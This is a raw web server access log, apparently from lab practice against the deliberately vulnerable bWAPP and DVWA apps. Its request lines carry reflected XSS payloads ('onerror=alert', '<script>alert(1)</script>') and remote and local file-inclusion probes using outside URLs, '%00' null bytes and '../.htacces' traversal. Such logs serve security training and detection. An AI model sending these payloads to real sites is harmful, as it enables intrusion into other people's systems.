192.168.100.12 - - [24/Feb/2022:17:01:43 -0500] "GET /bWAPP/xss_ajax_1-1.php HTTP/1.1" 200 3096 "http://192.168.100.51/bWAPP/portal.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:01:43 -0500] "GET /bWAPP/xss_ajax_1-2.php?title= HTTP/1.1" 200 127 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:01:44 -0500] "GET /bWAPP/xss_ajax_1-2.php?title= HTTP/1.1" 200 127 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:01:45 -0500] "GET /bWAPP/xss_ajax_1-2.php?title=%26lt%3Bimg%20src%3Dx%20onerror%3Dalert(%26%2339%3B13%20Reasons%20Why%26%2339%3B)%26gt%3B HTTP/1.1" 200 164 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:01:45 -0500] "GET /bWAPP/x HTTP/1.1" 404 181 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:01:46 -0500] "GET /bWAPP/xss_ajax_1-2.php?title=%26lt%3Bimg%20src%3Dx%20onerror%3Dalert(%26%2339%3B13%20Reasons%20Why%26%2339%3B)%26gt%3B HTTP/1.1" 200 164 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:01:46 -0500] "GET /bWAPP/x HTTP/1.1" 404 181 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:01:47 -0500] "GET /bWAPP/xss_ajax_1-2.php?title=%26lt%3Bimg%20src%3Dx%20onerror%3Dalert(%26%2339%3B13%20Reasons%20Why%26%2339%3B)%26gt%3B HTTP/1.1" 200 164 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:01:47 -0500] "GET /bWAPP/x HTTP/1.1" 404 181 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:01:48 -0500] "GET /bWAPP/portal.php HTTP/1.1" 200 3584 "http://192.168.100.51/bWAPP/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:02:15 -0500] "POST /bWAPP/portal.php HTTP/1.1" 302 3584 "http://192.168.100.51/bWAPP/portal.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:02:15 -0500] "GET /bWAPP/xss_ajax_1-1.php HTTP/1.1" 200 3096 "http://192.168.100.51/bWAPP/portal.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:02:15 -0500] "GET /bWAPP/xss_ajax_1-2.php?title= HTTP/1.1" 200 127 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:02:16 -0500] "GET /bWAPP/xss_ajax_1-2.php?title= HTTP/1.1" 200 127 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:02:17 -0500] "GET /bWAPP/xss_ajax_1-2.php?title= HTTP/1.1" 200 127 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:02:18 -0500] "GET /bWAPP/xss_ajax_1-2.php?title=%26lt%3Bimg%20src%3Dx%20onerror%3Dalert(%26%2339%3BReasons%20Why%26%2339%3B)%26gt%3B HTTP/1.1" 200 161 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:02:18 -0500] "GET /bWAPP/x HTTP/1.1" 404 181 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:02:19 -0500] "GET /bWAPP/xss_ajax_1-2.php?title=%26lt%3Bimg%20src%3Dx%20onerror%3Dalert(%26%2339%3BReasons%20Why%26%2339%3B)%26gt%3B HTTP/1.1" 200 161 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:02:19 -0500] "GET /bWAPP/x HTTP/1.1" 404 181 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:02:19 -0500] "GET /bWAPP/portal.php HTTP/1.1" 200 3584 "http://192.168.100.51/bWAPP/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:03:13 -0500] "POST /bWAPP/portal.php HTTP/1.1" 302 3584 "http://192.168.100.51/bWAPP/portal.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:03:13 -0500] "GET /bWAPP/xss_ajax_1-1.php HTTP/1.1" 200 3096 "http://192.168.100.51/bWAPP/portal.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:03:13 -0500] "GET /bWAPP/xss_ajax_1-2.php?title= HTTP/1.1" 200 127 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:03:14 -0500] "GET /bWAPP/xss_ajax_1-2.php?title= HTTP/1.1" 200 127 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:03:15 -0500] "GET /bWAPP/xss_ajax_1-2.php?title= HTTP/1.1" 200 127 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:03:16 -0500] "GET /bWAPP/xss_ajax_1-2.php?title=%26lt%3Bimg%20src%3Dx%20onerror%3Dalert(%26%2339%3BReasons%20Why%26%2339%3B)%26gt%3B HTTP/1.1" 200 161 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:03:16 -0500] "GET /bWAPP/x HTTP/1.1" 404 181 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:03:17 -0500] "GET /bWAPP/xss_ajax_1-2.php?title=%26lt%3Bimg%20src%3Dx%20onerror%3Dalert(%26%2339%3BReasons%20Why%26%2339%3B)%26gt%3B HTTP/1.1" 200 161 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:03:17 -0500] "GET /bWAPP/x HTTP/1.1" 404 181 "http://192.168.100.51/bWAPP/xss_ajax_1-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:03:18 -0500] "GET /bWAPP/portal.php HTTP/1.1" 200 3584 "http://192.168.100.51/bWAPP/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:05:26 -0500] "POST /bWAPP/portal.php HTTP/1.1" 302 3584 "http://192.168.100.51/bWAPP/portal.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:05:26 -0500] "GET /bWAPP/xss_href-1.php HTTP/1.1" 200 3057 "http://192.168.100.51/bWAPP/portal.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:05:33 -0500] "GET /bWAPP/xss_href-2.php?name=%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C&action=vote HTTP/1.1" 200 3554 "http://192.168.100.51/bWAPP/xss_href-1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:05:37 -0500] "GET /bWAPP/xss_href-1.php HTTP/1.1" 200 3057 "http://192.168.100.51/bWAPP/portal.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:05:38 -0500] "GET /bWAPP/portal.php HTTP/1.1" 200 3584 "http://192.168.100.51/bWAPP/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:05:40 -0500] "GET /bWAPP/portal.php HTTP/1.1" 200 3584 "http://192.168.100.51/bWAPP/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:05:47 -0500] "GET /bWAPP/login.php HTTP/1.1" 200 1149 "http://192.168.100.51/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:05:49 -0500] "GET /bWAPP/portal.php HTTP/1.1" 200 3584 "http://192.168.100.51/bWAPP/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:05:57 -0500] "GET /bWAPP/login.php HTTP/1.1" 200 1149 "http://192.168.100.51/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:06:07 -0500] "POST /bWAPP/login.php HTTP/1.1" 302 20 "http://192.168.100.51/bWAPP/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:06:07 -0500] "GET /bWAPP/portal.php HTTP/1.1" 200 3584 "http://192.168.100.51/bWAPP/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:07:00 -0500] "POST /bWAPP/portal.php HTTP/1.1" 302 3584 "http://192.168.100.51/bWAPP/portal.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:07:00 -0500] "GET /bWAPP/xss_php_self.php HTTP/1.1" 200 3125 "http://192.168.100.51/bWAPP/portal.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:07:28 -0500] "GET /bWAPP/xss_php_self.php?firstname=vrt&lastname=%3Cscript%3Ealert%282%29%3C%2Fscript%3E&form=submit HTTP/1.1" 200 3147 "http://192.168.100.51/bWAPP/xss_php_self.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:07:32 -0500] "GET /bWAPP/xss_php_self.php HTTP/1.1" 200 3125 "http://192.168.100.51/bWAPP/portal.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.100.12 - - [24/Feb/2022:17:07:33 -0500] "GET /bWAPP/portal.php HTTP/1.1" 200 3584 "http://192.168.100.51/bWAPP/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:26:30 -0500] "GET /favicon.ico HTTP/1.1" 200 3638 "http://192.168.0.101/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:26:32 -0500] "GET /bWAPP/ HTTP/1.1" 302 20 "http://192.168.0.101/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:26:32 -0500] "GET /bWAPP/portal.php HTTP/1.1" 302 20 "http://192.168.0.101/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:26:32 -0500] "GET /bWAPP/login.php HTTP/1.1" 200 1149 "http://192.168.0.101/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:26:33 -0500] "GET /bWAPP/images/favicon.ico HTTP/1.1" 200 1150 "http://192.168.0.101/bWAPP/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:26:38 -0500] "POST /bWAPP/login.php HTTP/1.1" 302 20 "http://192.168.0.101/bWAPP/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:26:38 -0500] "GET /bWAPP/portal.php HTTP/1.1" 200 3584 "http://192.168.0.101/bWAPP/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:27:21 -0500] "POST /bWAPP/portal.php HTTP/1.1" 302 20 "http://192.168.0.101/bWAPP/portal.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:27:21 -0500] "GET /bWAPP/rlfi.php HTTP/1.1" 200 3115 "http://192.168.0.101/bWAPP/portal.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:27:23 -0500] "GET /bWAPP/rlfi.php?language=lang_en.php&action=go HTTP/1.1" 200 3146 "http://192.168.0.101/bWAPP/rlfi.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:27:36 -0500] "GET /bWAPP/rlfi.php?language=index.php&action=go HTTP/1.1" 302 3115 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:27:36 -0500] "GET /bWAPP/portal.php HTTP/1.1" 200 3584 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:27:43 -0500] "GET /bWAPP/rlfi.php?language=lang_en.php&action=go HTTP/1.1" 200 3146 "http://192.168.0.101/bWAPP/rlfi.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:29:12 -0500] "GET /bWAPP/rlfi.php?language=lang_en.php&action=go HTTP/1.1" 200 3146 "http://192.168.0.101/bWAPP/rlfi.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:29:42 -0500] "GET /bWAPP/rlfi.php?language=https://evenimentt.herokuapp.com/database_scheme.PNG&action=go HTTP/1.1" 200 3115 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:30:09 -0500] "GET /bWAPP/rlfi.php?language=https://cdn.pixabay.com/photo/2015/04/23/22/00/tree-736885__480.jpg&action=go HTTP/1.1" 200 3115 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:30:40 -0500] "GET /bWAPP/rlfi.php?language=https://evenimentt.herokuapp.com/&action=go HTTP/1.1" 200 3115 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:30:50 -0500] "GET /bWAPP/rlfi.php?language=https://evenimentt.herokuapp.com%00&action=go HTTP/1.1" 200 3115 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:31:04 -0500] "GET /bWAPP/rlfi.php?language=https://cdn.pixabay.com/photo/2015/04/23/22/00/tree-736885__480.jpg%00&action=go HTTP/1.1" 200 3115 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:31:12 -0500] "GET /bWAPP/rlfi.php?language=https://cdn.pixabay.com/photo/2015/04/23/22/00/tree-736885__480%00&action=go HTTP/1.1" 200 3115 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:31:23 -0500] "GET /bWAPP/rlfi.php?language=https://cdn.pixabay.com/photo/2015/04/23/22/00/tree-736885__480.jpg&action=go HTTP/1.1" 200 3115 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:31:29 -0500] "GET /bWAPP/rlfi.php?language=lang_en.php&action=go HTTP/1.1" 200 3146 "http://192.168.0.101/bWAPP/rlfi.php?language=https://cdn.pixabay.com/photo/2015/04/23/22/00/tree-736885__480.jpg&action=go" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:31:41 -0500] "GET /bWAPP/rlfi.php?language=../.htacces&action=go HTTP/1.1" 200 3115 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:31:55 -0500] "GET /bWAPP/rlfi.php?language=.htacces&action=go HTTP/1.1" 200 3115 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:32:33 -0500] "GET /dvwa/ HTTP/1.1" 302 20 "http://192.168.0.101/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:32:33 -0500] "GET /dvwa/login.php HTTP/1.1" 200 600 "http://192.168.0.101/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:32:37 -0500] "POST /dvwa/login.php HTTP/1.1" 302 20 "http://192.168.0.101/dvwa/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:32:37 -0500] "GET /dvwa/index.php HTTP/1.1" 200 1660 "http://192.168.0.101/dvwa/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:32:37 -0500] "GET /dvwa/favicon.ico HTTP/1.1" 200 1406 "http://192.168.0.101/dvwa/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:32:40 -0500] "GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1" 200 1250 "http://192.168.0.101/dvwa/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:32:53 -0500] "GET /dvwa/vulnerabilities/fi/?page=https://cdn.pixabay.com/photo/2015/04/23/22/00/tree-736885__480.jpg HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:33:29 -0500] "GET /dvwa/vulnerabilities/fi/?page=https://www.gettyimages.dk/gi-resources/images/500px/983794168.jpg%00 HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:33:35 -0500] "GET /dvwa/vulnerabilities/fi/?page=https://www.gettyimages.dk/gi-resources/images/500px/983794168.jpg HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:33:55 -0500] "GET /dvwa/vulnerabilities/fi/?page=https://evenimentt.herokuapp.com HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:34:10 -0500] "GET /dvwa/vulnerabilities/fi/?page=https://evenimentt.herokuapp.com/database_scheme.PNG HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:35:55 -0500] "GET /bWAPP/rlfi.php?language=.htacces%00&action=go HTTP/1.1" 200 3115 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:36:34 -0500] "GET /dvwa/vulnerabilities/fi/?page=https://evenimentt.herokuapp.com/database_scheme.PNG HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:36:46 -0500] "GET /dvwa/ HTTP/1.1" 200 1632 "http://192.168.0.101/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:36:50 -0500] "GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1" 200 1250 "http://192.168.0.101/dvwa/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:36:55 -0500] "GET /dvwa/vulnerabilities/fi/?page=inde.php HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:37:00 -0500] "GET /dvwa/vulnerabilities/fi/?page=index.php HTTP/1.1" 500 20 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:12:37:04 -0500] "GET /dvwa/vulnerabilities/fi/?page=index.php HTTP/1.1" 500 20 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
